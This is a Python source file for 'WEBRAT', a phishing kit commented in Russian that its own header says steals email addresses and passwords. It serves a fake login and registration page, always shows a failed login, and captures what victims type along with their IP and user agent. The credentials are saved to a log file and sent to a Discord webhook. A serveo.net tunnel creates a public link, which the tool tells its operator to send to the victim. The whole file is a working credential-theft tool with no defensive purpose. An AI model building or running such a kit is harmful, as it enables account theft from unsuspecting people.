#!/usr/bin/env python3
# WEBRAT by @DADILK - С АНИМАЦИЕЙ, CLEAR И УДОБНЫМ МЕНЮ
# ДЛЯ ISH - КРАДЕТ ПОЧТУ И ПАРОЛЬ

import http.server
import socketserver
import json
import datetime
import threading
import time
import subprocess
import os
import random
import string
import sys
import requests
import urllib.parse

# ============================================
# ФАЙЛЫ ДЛЯ СОХРАНЕНИЯ
# ============================================
CONFIG_FILE = '/sdcard/webrat_config.json'
LOG_FILE = '/sdcard/webrat_logs.txt'

# ============================================
# ЦВЕТА ДЛЯ ТЕРМИНАЛА
# ============================================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    MAGENTA = '\033[35m'
    WHITE = '\033[97m'
    BLACK = '\033[90m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    LIGHT_MAGENTA = '\033[95m'
    LIGHT_CYAN = '\033[96m'

# ============================================
# ФУНКЦИЯ ОЧИСТКИ ЭКРАНА
# ============================================
def clear_screen():
    """Очищает экран терминала"""
    os.system('clear' if os.name == 'posix' else 'cls')

# ============================================
# АНИМАЦИИ
# ============================================
def loading_animation(text, duration=1):
    """Анимация загрузки"""
    animation = "|/-\\"
    for i in range(20):
        time.sleep(duration/20)
        sys.stdout.write(f"\r{Colors.CYAN}{text} {animation[i % len(animation)]}{Colors.END}")
        sys.stdout.flush()
    print()

def typing_animation(text, delay=0.05):
    """Анимация печатающегося текста"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def progress_bar(current, total, bar_length=30):
    """Прогресс бар"""
    percent = float(current) * 100 / total
    arrow = '-' * int(percent/100 * bar_length - 1) + '>'
    spaces = ' ' * (bar_length - len(arrow))
    sys.stdout.write(f"\r{Colors.GREEN}Прогресс: [{arrow}{spaces}] {int(percent)}%{Colors.END}")
    sys.stdout.flush()

def pulse_animation(text, duration=2):
    """Пульсирующая анимация"""
    for _ in range(10):
        for brightness in range(0, 100, 10):
            sys.stdout.write(f"\r\033[38;5;{brightness+20}m{text}\033[0m")
            sys.stdout.flush()
            time.sleep(duration/20)
    print()

# ============================================
# ЗАГРУЗКА/СОХРАНЕНИЕ НАСТРОЕК
# ============================================
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {"webhook": ""}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

# ============================================
# КРАСИВЫЙ БАННЕР
# ============================================
def print_banner():
    """Красивый баннер при запуске"""
    clear_screen()
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════╗
{Colors.RED}║{Colors.YELLOW}  █     █░ ███████ ██████  ██████   █████  ████████ {Colors.RED}║
{Colors.RED}║{Colors.YELLOW}  ██   ██░ ██      ██   ██ ██   ██ ██   ██    ██    {Colors.RED}║
{Colors.RED}║{Colors.YELLOW}  ██   ██░ █████   ██████  ██████  ███████    ██    {Colors.RED}║
{Colors.RED}║{Colors.YELLOW}  ██   ██░ ██      ██   ██ ██   ██ ██   ██    ██    {Colors.RED}║
{Colors.RED}║{Colors.YELLOW}  ███████░ ███████ ██████  ██   ██ ██   ██    ██    {Colors.RED}║
{Colors.RED}╠══════════════════════════════════════════════════════════╣
{Colors.RED}║{Colors.CYAN}              by @DADILK - PREMIUM VERSION           {Colors.RED}║
{Colors.RED}║{Colors.GREEN}         Профессиональный фишинг инструмент          {Colors.RED}║
{Colors.RED}╚══════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)
    pulse_animation("🔥 WEBRAT PREMIUM 🔥", 1)
    time.sleep(1)

# ============================================
# HTML СТРАНИЦА WEBRAT (ТОЛЬКО ПОЧТА И ПАРОЛЬ)
# ============================================
WEBRAT_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WEBRAT by @DADILK</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }
        
        /* Анимированный фон */
        .bg-animation {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            overflow: hidden;
        }
        
        .bg-animation div {
            position: absolute;
            background: rgba(255,255,255,0.05);
            border-radius: 50%;
            animation: float 20s infinite;
        }
        
        @keyframes float {
            0% { transform: translateY(0) rotate(0deg); }
            100% { transform: translateY(-1000px) rotate(720deg); }
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            max-width: 450px;
            width: 100%;
            padding: 40px;
            border-radius: 30px;
            box-shadow: 0 30px 80px rgba(0,0,0,0.4);
            animation: slideIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            position: relative;
            z-index: 1;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        @keyframes slideIn {
            0% { opacity: 0; transform: translateY(100px) scale(0.8); }
            100% { opacity: 1; transform: translateY(0) scale(1); }
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            font-size: 52px;
            font-weight: 900;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            letter-spacing: 3px;
            animation: glow 2s ease-in-out infinite;
        }
        
        @keyframes glow {
            0%, 100% { filter: drop-shadow(0 0 5px rgba(102,126,234,0.3)); }
            50% { filter: drop-shadow(0 0 20px rgba(102,126,234,0.7)); }
        }
        
        .logo span {
            font-size: 18px;
            display: block;
            background: linear-gradient(135deg, #764ba2, #667eea);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 1px;
        }
        
        .tab-container {
            display: flex;
            margin-bottom: 30px;
            border-bottom: 2px solid #f0f0f0;
            gap: 10px;
        }
        
        .tab {
            flex: 1;
            text-align: center;
            padding: 15px;
            cursor: pointer;
            color: #666;
            font-weight: 600;
            transition: all 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            position: relative;
            border-radius: 10px 10px 0 0;
        }
        
        .tab:hover {
            color: #667eea;
            background: rgba(102,126,234,0.05);
            transform: translateY(-2px);
        }
        
        .tab.active {
            color: #667eea;
        }
        
        .tab.active::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            animation: slideUnder 0.3s ease;
        }
        
        @keyframes slideUnder {
            from { width: 0; left: 50%; }
            to { width: 100%; left: 0; }
        }
        
        .form {
            display: none;
            animation: fadeScale 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }
        
        .form.active {
            display: block;
        }
        
        @keyframes fadeScale {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
        
        .input-group {
            margin-bottom: 25px;
            position: relative;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s;
        }
        
        input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #f0f0f0;
            border-radius: 15px;
            font-size: 16px;
            transition: all 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            background: rgba(255,255,255,0.9);
        }
        
        input:focus {
            border-color: #667eea;
            outline: none;
            box-shadow: 0 10px 30px rgba(102,126,234,0.2);
            transform: translateY(-2px);
        }
        
        .button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            margin: 20px 0;
            position: relative;
            overflow: hidden;
        }
        
        .button::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255,255,255,0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }
        
        .button:hover::before {
            width: 300px;
            height: 300px;
        }
        
        .button:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 40px rgba(102,126,234,0.4);
        }
        
        .button:active {
            transform: translateY(0);
        }
        
        .message {
            text-align: center;
            padding: 15px;
            border-radius: 15px;
            font-size: 14px;
            margin: 20px 0;
            display: none;
            animation: shake 0.5s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
        }
        
        @keyframes shake {
            10%, 90% { transform: translate3d(-1px, 0, 0); }
            20%, 80% { transform: translate3d(2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        
        .success-message {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            animation: pulse 2s infinite;
        }
        
        .error-message {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #999;
            font-size: 12px;
        }
        
        .footer a {
            color: #667eea;
            text-decoration: none;
            transition: all 0.3s;
        }
        
        .footer a:hover {
            color: #764ba2;
            text-decoration: underline;
        }
        
        .dev {
            margin-top: 10px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
            font-size: 14px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.8; transform: scale(1.05); }
            100% { opacity: 1; transform: scale(1); }
        }
        
        .particle {
            position: absolute;
            width: 10px;
            height: 10px;
            background: rgba(255,255,255,0.5);
            border-radius: 50%;
            pointer-events: none;
            animation: particle 1s ease-out forwards;
        }
        
        @keyframes particle {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(0); opacity: 0; }
        }
        
        .input-icon {
            position: relative;
        }
        
        .input-icon i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
        }
        
        .info-text {
            text-align: center;
            color: #666;
            font-size: 13px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <!-- Анимированный фон -->
    <div class="bg-animation" id="bgAnimation"></div>
    
    <div class="container">
        <div class="header">
            <div class="logo">
                WEBRAT
                <span>by @DADILK</span>
            </div>
            <div class="info-text">Профессиональная платформа</div>
        </div>
        
        <div class="tab-container">
            <div class="tab active" onclick="switchTab('login')">🔐 Вход</div>
            <div class="tab" onclick="switchTab('register')">📝 Регистрация</div>
        </div>
        
        <!-- ФОРМА ВХОДА (ТОЛЬКО ПОЧТА И ПАРОЛЬ) -->
        <div id="loginForm" class="form active">
            <div class="input-group">
                <label>📧 ЭЛЕКТРОННАЯ ПОЧТА</label>
                <input type="email" id="loginEmail" placeholder="example@gmail.com" required>
            </div>
            
            <div class="input-group">
                <label>🔑 ПАРОЛЬ</label>
                <input type="password" id="loginPassword" placeholder="············" required>
            </div>
            
            <button class="button" onclick="login()">
                <span>🚀 Войти в систему</span>
            </button>
            
            <div id="loginError" class="message error-message">
                ❌ Неверный email или пароль
            </div>
            
            <div style="text-align: center; margin-top: 10px;">
                <a href="#" style="color: #667eea; text-decoration: none; font-size: 13px;">Забыли пароль?</a>
            </div>
        </div>
        
        <!-- ФОРМА РЕГИСТРАЦИИ (ТОЛЬКО ПОЧТА И ПАРОЛЬ) -->
        <div id="registerForm" class="form">
            <div class="input-group">
                <label>📧 ЭЛЕКТРОННАЯ ПОЧТА</label>
                <input type="email" id="regEmail" placeholder="example@gmail.com" required>
            </div>
            
            <div class="input-group">
                <label>🔑 ПАРОЛЬ</label>
                <input type="password" id="regPassword" placeholder="············" required>
            </div>
            
            <div class="input-group">
                <label>🔑 ПОДТВЕРДИТЕ ПАРОЛЬ</label>
                <input type="password" id="regConfirm" placeholder="············" required>
            </div>
            
            <button class="button" onclick="register()">
                <span>✨ Создать аккаунт</span>
            </button>
            
            <div id="registerSuccess" class="message success-message">
                ✅ Регистрация успешна! Перенаправление...
            </div>
            
            <div style="text-align: center; margin-top: 10px; font-size: 12px; color: #999;">
                Регистрируясь, вы соглашаетесь с условиями использования
            </div>
        </div>
        
        <div class="footer">
            <div>WEBRAT v3.0 - Профессиональная платформа</div>
            <div class="dev">⚡ Разработано @DADILK ⚡</div>
            <div style="margin-top: 10px;">&copy; 2024 WEBRAT. Все права защищены.</div>
        </div>
    </div>

    <script>
        // Создание анимированного фона
        function createBackground() {
            const bg = document.getElementById('bgAnimation');
            for (let i = 0; i < 50; i++) {
                let div = document.createElement('div');
                let size = Math.random() * 100 + 50;
                div.style.width = size + 'px';
                div.style.height = size + 'px';
                div.style.left = Math.random() * 100 + '%';
                div.style.bottom = -size + 'px';
                div.style.animationDuration = Math.random() * 20 + 10 + 's';
                div.style.animationDelay = Math.random() * 5 + 's';
                bg.appendChild(div);
            }
        }
        
        // Эффект частиц при клике
        function createParticle(x, y) {
            for (let i = 0; i < 10; i++) {
                let particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = x + 'px';
                particle.style.top = y + 'px';
                particle.style.transform = `translate(${Math.random()*100-50}px, ${Math.random()*100-50}px)`;
                document.body.appendChild(particle);
                setTimeout(() => particle.remove(), 1000);
            }
        }
        
        document.addEventListener('click', function(e) {
            createParticle(e.clientX, e.clientY);
        });
        
        function switchTab(tab) {
            const tabs = document.querySelectorAll('.tab');
            const forms = document.querySelectorAll('.form');
            
            tabs.forEach(t => t.classList.remove('active'));
            forms.forEach(f => f.classList.remove('active'));
            
            if (tab === 'login') {
                tabs[0].classList.add('active');
                document.getElementById('loginForm').classList.add('active');
            } else {
                tabs[1].classList.add('active');
                document.getElementById('registerForm').classList.add('active');
            }
        }
        
        function login() {
            const email = document.getElementById('loginEmail').value;
            const password = document.getElementById('loginPassword').value;
            const errorMsg = document.getElementById('loginError');
            
            if (!email || !password) {
                errorMsg.textContent = '❌ Заполните все поля';
                errorMsg.style.display = 'block';
                setTimeout(() => errorMsg.style.display = 'none', 3000);
                return;
            }
            
            if (!email.includes('@')) {
                errorMsg.textContent = '❌ Введите корректный email';
                errorMsg.style.display = 'block';
                setTimeout(() => errorMsg.style.display = 'none', 3000);
                return;
            }
            
            // Отправляем данные на сервер
            fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'login',
                    email: email,
                    password: password,
                    userAgent: navigator.userAgent,
                    time: new Date().toLocaleString()
                })
            });
            
            // Показываем ошибку (вход всегда неудачный)
            errorMsg.style.display = 'block';
            document.getElementById('loginPassword').value = '';
            
            // Анимация кнопки
            const btn = event.target;
            btn.style.transform = 'scale(0.95)';
            setTimeout(() => btn.style.transform = 'scale(1)', 200);
        }
        
        function register() {
            const email = document.getElementById('regEmail').value;
            const password = document.getElementById('regPassword').value;
            const confirm = document.getElementById('regConfirm').value;
            const successMsg = document.getElementById('registerSuccess');
            
            if (!email || !password || !confirm) {
                alert('❌ Заполните все поля');
                return;
            }
            
            if (!email.includes('@')) {
                alert('❌ Введите корректный email');
                return;
            }
            
            if (password.length < 6) {
                alert('❌ Пароль должен быть минимум 6 символов');
                return;
            }
            
            if (password !== confirm) {
                alert('❌ Пароли не совпадают');
                return;
            }
            
            // Отправляем данные на сервер
            fetch('/register', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'register',
                    email: email,
                    password: password,
                    userAgent: navigator.userAgent,
                    time: new Date().toLocaleString()
                })
            });
            
            // Показываем успех
            successMsg.style.display = 'block';
            
            // Очищаем форму
            document.getElementById('regEmail').value = '';
            document.getElementById('regPassword').value = '';
            document.getElementById('regConfirm').value = '';
            
            // Анимация кнопки
            const btn = event.target;
            btn.style.transform = 'scale(0.95)';
            setTimeout(() => btn.style.transform = 'scale(1)', 200);
            
            // Переключаем на вход через 2 секунды
            setTimeout(() => {
                successMsg.style.display = 'none';
                switchTab('login');
            }, 2000);
        }
        
        // Инициализация фона
        createBackground();
    </script>
</body>
</html>"""

# ============================================
# HTTP HANDLER
# ============================================
class WebRatHandler(http.server.SimpleHTTPRequestHandler):
    webhook_url = ""
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(WEBRAT_PAGE.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))
        
        # Добавляем IP
        data['ip'] = self.client_address[0]
        data['timestamp'] = str(datetime.datetime.now())
        
        # Определяем тип действия
        if self.path == '/login':
            self.handle_login(data)
        elif self.path == '/register':
            self.handle_register(data)
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'status': 'ok'}).encode())
    
    def handle_login(self, data):
        """Обработка попытки входа"""
        print(f"\n{Colors.RED}╔══════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.RED}║{Colors.YELLOW}                    🔴 ПОПЫТКА ВХОДА                      {Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}╠══════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.RED}║{Colors.CYAN} 📧 Email: {data['email']}{' ' * (40 - len(data['email']))}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}║{Colors.CYAN} 🔑 Пароль: {data['password']}{' ' * (38 - len(data['password']))}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}║{Colors.CYAN} 🌐 IP: {data['ip']}{' ' * (43 - len(data['ip']))}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}║{Colors.CYAN} 🕐 Время: {data['timestamp']}{' ' * (37 - len(data['timestamp']))}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}╚══════════════════════════════════════════════════════════╝{Colors.END}")
        
        # Сохраняем в файл
        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(data) + '\n')
        
        # Отправляем в Discord
        if self.webhook_url:
            self.send_to_discord(data, "🔴 ПОПЫТКА ВХОДА")
    
    def handle_register(self, data):
        """Обработка регистрации"""
        print(f"\n{Colors.GREEN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.GREEN}║{Colors.YELLOW}                   🟢 НОВАЯ РЕГИСТРАЦИЯ                   {Colors.GREEN}║{Colors.END}")
        print(f"{Colors.GREEN}╠══════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.GREEN}║{Colors.CYAN} 📧 Email: {data['email']}{' ' * (40 - len(data['email']))}{Colors.GREEN}║{Colors.END}")
        print(f"{Colors.GREEN}║{Colors.CYAN} 🔑 Пароль: {data['password']}{' ' * (38 - len(data['password']))}{Colors.GREEN}║{Colors.END}")
        print(f"{Colors.GREEN}║{Colors.CYAN} 🌐 IP: {data['ip']}{' ' * (43 - len(data['ip']))}{Colors.GREEN}║{Colors.END}")
        print(f"{Colors.GREEN}║{Colors.CYAN} 🕐 Время: {data['timestamp']}{' ' * (37 - len(data['timestamp']))}{Colors.GREEN}║{Colors.END}")
        print(f"{Colors.GREEN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
        
        # Сохраняем в файл
        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(data) + '\n')
        
        # Отправляем в Discord
        if self.webhook_url:
            self.send_to_discord(data, "🟢 НОВАЯ РЕГИСТРАЦИЯ")
    
    def send_to_discord(self, data, action):
        """Отправка в Discord Webhook"""
        try:
            # Формируем сообщение
            if "ВХОДА" in action:
                color = 15548997  # красный
                fields = [
                    {"name": "📧 Email", "value": f"```{data['email']}```", "inline": False},
                    {"name": "🔑 Пароль", "value": f"```{data['password']}```", "inline": False}
                ]
            else:  # регистрация
                color = 5763719  # зеленый
                fields = [
                    {"name": "📧 Email", "value": f"```{data['email']}```", "inline": False},
                    {"name": "🔑 Пароль", "value": f"```{data['password']}```", "inline": False}
                ]
            
            # Добавляем общие поля
            fields.extend([
                {"name": "🌐 IP Адрес", "value": f"```{data['ip']}```", "inline": True},
                {"name": "🕐 Время", "value": f"```{data['timestamp']}```", "inline": True},
                {"name": "📱 User Agent", "value": f"```{data.get('userAgent', 'N/A')[:100]}...```", "inline": False}
            ])
            
            webhook_data = {
                "embeds": [{
                    "title": f"🔥 WEBRAT by @DADILK - {action}",
                    "color": color,
                    "fields": fields,
                    "footer": {"text": f"WEBRAT v3.0 | {data['ip']}"}
                }]
            }
            
            response = requests.post(self.webhook_url, json=webhook_data)
            if response.status_code == 204:
                print(f"{Colors.GREEN}✅ Отправлено в Discord{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Ошибка отправки: {response.status_code}{Colors.END}")
                
        except Exception as e:
            print(f"{Colors.RED}❌ Ошибка отправки в Discord: {e}{Colors.END}")

# ============================================
# ФУНКЦИИ ДЛЯ РАБОТЫ
# ============================================
def get_local_ip():
    try:
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line and '127.0.0.1' not in line:
                return line.split()[1]
    except:
        pass
    return '127.0.0.1'

def create_public_url(port):
    """Создает публичную ссылку через serveo.net"""
    try:
        subdomain = f"webrat-{''.join(random.choices(string.ascii_lowercase, k=6))}"
        cmd = f"ssh -R {subdomain}:80:localhost:{port} serveo.net"
        
        # Запускаем в фоне
        process = subprocess.Popen(
            cmd.split(),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(3)
        public_url = f"https://{subdomain}.serveo.net"
        return public_url
    except:
        return None

def view_logs():
    """Просмотр сохраненных данных"""
    if not os.path.exists(LOG_FILE):
        print(f"{Colors.RED}❌ Логов пока нет{Colors.END}")
        return
    
    with open(LOG_FILE, 'r') as f:
        logs = f.readlines()
    
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.YELLOW}              📁 WEBRAT LOGS ({len(logs)} записей)              {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
    
    for i, log in enumerate(logs[-20:], 1):
        try:
            data = json.loads(log)
            if data.get('type') == 'register':
                print(f"\n{Colors.GREEN}{i}. 🟢 РЕГИСТРАЦИЯ{Colors.END}")
                print(f"   {Colors.CYAN}📧 {data.get('email', 'N/A')}{Colors.END}")
                print(f"   {Colors.CYAN}🔑 {data.get('password', 'N/A')}{Colors.END}")
            else:
                print(f"\n{Colors.RED}{i}. 🔴 ВХОД{Colors.END}")
                print(f"   {Colors.CYAN}📧 {data.get('email', 'N/A')}{Colors.END}")
                print(f"   {Colors.CYAN}🔑 {data.get('password', 'N/A')}{Colors.END}")
            print(f"   {Colors.CYAN}🌐 {data.get('ip', 'N/A')}{Colors.END}")
            print(f"   {Colors.CYAN}🕐 {data.get('timestamp', 'N/A')}{Colors.END}")
            print(f"{Colors.YELLOW}{'-'*50}{Colors.END}")
        except:
            print(f"\n{i}. {log}")
    
    input(f"\n{Colors.CYAN}Нажми Enter чтобы продолжить...{Colors.END}")

def main_menu():
    """Главное меню"""
    config = load_config()
    
    while True:
        clear_screen()
        print_banner()
        
        print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.YELLOW}                         МЕНЮ                           {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}╠══════════════════════════════════════════════════════════╣{Colors.END}")
        webhook_status = f"{Colors.GREEN}✅ Настроен{Colors.END}" if config['webhook'] else f"{Colors.RED}❌ Не настроен{Colors.END}"
        print(f"{Colors.CYAN}║{Colors.WHITE} 1. Настройка Discord Webhook {webhook_status:>30}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 2. Запустить локальный сервер{' ' * 40}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 3. Запустить с публичной ссылкой{' ' * 36}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 4. Просмотр сохраненных данных{' ' * 35}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 5. Очистить все данные{' ' * 42}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 0. Выход{' ' * 55}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
        
        choice = input(f"{Colors.YELLOW}Выберите действие (0-5): {Colors.END}").strip()
        
        if choice == "1":
            clear_screen()
            print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.YELLOW}                 НАСТРОЙКА WEBHOOK                   {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
            webhook = input(f"{Colors.GREEN}Введите Discord Webhook URL: {Colors.END}").strip()
            if webhook:
                config['webhook'] = webhook
                save_config(config)
                print(f"{Colors.GREEN}✅ Webhook сохранен!{Colors.END}")
                time.sleep(1)
        
        elif choice == "2":
            if not config['webhook']:
                print(f"{Colors.RED}❌ Сначала настройте webhook!{Colors.END}")
                time.sleep(1)
                continue
            start_server(config, public=False)
        
        elif choice == "3":
            if not config['webhook']:
                print(f"{Colors.RED}❌ Сначала настройте webhook!{Colors.END}")
                time.sleep(1)
                continue
            start_server(config, public=True)
        
        elif choice == "4":
            view_logs()
        
        elif choice == "5":
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
                print(f"{Colors.GREEN}✅ Данные очищены{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Нет данных для очистки{Colors.END}")
            time.sleep(1)
        
        elif choice == "0":
            print(f"{Colors.YELLOW}Выход...{Colors.END}")
            loading_animation("Завершение работы", 1)
            sys.exit(0)

def start_server(config, public=False):
    """Запуск сервера"""
    PORT = 8080
    
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.YELLOW}                 ЗАПУСК WEBRAT СЕРВЕРА                 {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
    
    loading_animation("Запуск сервера", 1)
    
    # Устанавливаем webhook
    WebRatHandler.webhook_url = config['webhook']
    
    # Получаем локальный IP
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    print(f"\n{Colors.GREEN}📌 Локальная ссылка: {Colors.CYAN}{local_url}{Colors.END}")
    print(f"{Colors.GREEN}📌 Локальный хост: {Colors.CYAN}http://localhost:{PORT}{Colors.END}")
    
    if public:
        print(f"\n{Colors.YELLOW}🔄 Создание публичной ссылки...{Colors.END}")
        public_url = create_public_url(PORT)
        
        if public_url:
            print(f"{Colors.GREEN}✅ Публичная ссылка: {Colors.CYAN}{public_url}{Colors.END}")
            print(f"\n{Colors.YELLOW}📎 Отправьте жертве: {Colors.CYAN}{public_url}{Colors.END}")
            
            # Отправляем ссылку в Discord
            try:
                webhook_data = {
                    "content": f"**🔥 WEBRAT by @DADILK - ССЫЛКА ГОТОВА**\n\n{public_url}"
                }
                requests.post(config['webhook'], json=webhook_data)
                print(f"{Colors.GREEN}✅ Ссылка отправлена в Discord{Colors.END}")
            except:
                pass
        else:
            print(f"{Colors.RED}❌ Не удалось создать публичную ссылку{Colors.END}")
            print(f"{Colors.YELLOW}📌 Используйте локальную ссылку{Colors.END}")
    
    print(f"\n{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.GREEN}              ⏳ WEBRAT ЗАПУЩЕН                     {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.WHITE} 📁 Логи: {LOG_FILE}{' ' * (35 - len(LOG_FILE))}{Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.WHITE} 🔴 Ожидание данных...{' ' * 41}{Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}\n")
    
    # Запускаем сервер
    handler = WebRatHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}❌ Сервер остановлен{Colors.END}")
            httpd.shutdown()
            time.sleep(1)

# ============================================
# ЗАПУСК
# ============================================
if __name__ == '__main__':
    # Создаем папку для логов
    os.makedirs('/sdcard', exist_ok=True)
    
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Выход...{Colors.END}")
        sys.exit(0)
